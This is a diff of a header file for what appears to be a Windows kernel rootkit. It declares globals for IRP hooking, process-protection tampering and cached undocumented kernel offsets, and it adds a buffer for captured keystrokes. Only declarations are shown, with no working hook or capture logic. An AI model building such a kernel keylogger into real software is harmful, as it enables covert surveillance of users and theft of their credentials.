@@ -7,29 +7,32 @@
 	General global definitions and macros
 */
 
+constexpr size_t MAX_KEYSTROKES_TO_SAVE = 8192;
 
 /*
 	Globals used in the project
 */
 struct Globals {
 	// Apc rundown protection
-	EX_RUNDOWN_REF ApcRundownProtection = { 0 };
+	EX_RUNDOWN_REF ApcRundownProtection;
 
 	// Global data relating to networking UM process
 	struct _NetworkingProcess {
-		Ppl::ProcessProtectionPolicy PrevProtectionLevel = { 0 };
-		HANDLE Pid = 0;
-		bool FoundFirstThread = false;
+		Ppl::ProcessProtectionPolicy PrevProtectionLevel;
+		HANDLE Pid;
+		bool FoundFirstThread;
 	} Network;
 
 	// Cached offsets/addresses of undocumented structues
 	// and functions
 	struct _CachedOffsets {
-		ULONG PsProtectionOffset = 0;
-		POBJECT_TYPE IoDriverObjectType = nullptr;
+		ULONG PsProtectionOffset;
+		POBJECT_TYPE IoDriverObjectType;
 	} CachedOffsets;
 
 	IrpHookManager* HookManager;
+
+	UCHAR KeystrokeBuffer[MAX_KEYSTROKES_TO_SAVE];
 };
 
 extern Globals g_Globals;
